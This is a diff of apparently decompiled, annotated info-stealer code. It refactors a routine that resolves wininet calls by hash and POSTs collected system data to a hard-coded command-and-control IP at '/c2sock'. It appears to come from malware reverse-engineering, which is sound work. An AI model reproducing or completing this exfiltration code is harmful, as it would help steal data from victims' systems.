@@ -38,7 +38,7 @@ size_t __cdecl PrcssingMultipartRequest(void *dataToSend, size_t dataSize, size_
     return resultSize;
 }
 
-int __cdecl WinnetDllFuncRelated(const char *postData, int dataSize, int extraParam)
+int __cdecl WinnetDllFuncRelated(const char *postData, int dataSize, int extraParam, PSTR IPaddrs)
 { /*
     WinnetDllFuncRelated:
     =====================
@@ -66,10 +66,10 @@ int __cdecl WinnetDllFuncRelated(const char *postData, int dataSize, int extraPa
 
     InternetConnectA_Func = (int (__stdcall *)(int, int, int, _DWORD, _DWORD, int, _DWORD, int))ResolveTheHash(
         2024816598, (int)L"wininet.dll");
-    connectionHandle = InternetConnectA_Func(sessionHandle, "195.123.226.91", 80, 0, 0, 3, 0, 1);
+    connectionHandle = InternetConnectA_Func(sessionHandle, IPaddrs, 80, 0, 0, 3, 0, 1);
 
     /*
-    int32_t esi_2 = ResolveHashes(2073911457, Param_1)(InternetConnectA_Func(sessionHandle, IPaddrs, 80, ebx, ebx, 3, ebx, 1), "POST", "/c2sock", 0, 0, 0, 0, 1); // ebx == 0
+    int32_t esi_2 = ResolveHashes(2073911457, Param_1)(InternetConnectA_Func(sessionHandle, "195.123.226.91", 80, ebx, ebx, 3, ebx, 1), "POST", "/c2sock", 0, 0, 0, 0, 1); // ebx == 0
     */
     
     HttpOpenRequestA_Func = (int (__stdcall *)(int, const char *, const char *, _DWORD, _DWORD, _DWORD, _DWORD, int))ResolveTheHash(
@@ -167,8 +167,8 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     AddRequestParameter((int)responseStatus, "pid", ShortSessionToken, (unsigned int *)&ProcessedUserID0);
     AddRequestParameter((int)responseStatus, "lid", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", (unsigned int *)&ProcessedUserID0);
     
-    ProccessingOrMapsTheWideCharacter(L"195.123.226.91");
-    WinnetDllFuncRelated(header_p_SysInfo, (int)responseStatus, DataSizeCounter);
+    PSTR ip195 = ProccessingOrMapsTheWideCharacter(L"195.123.226.91");
+    WinnetDllFuncRelated(header_p_SysInfo, (int)responseStatus, DataSizeCounter, ip195);
     
     return _free(Block);
 }
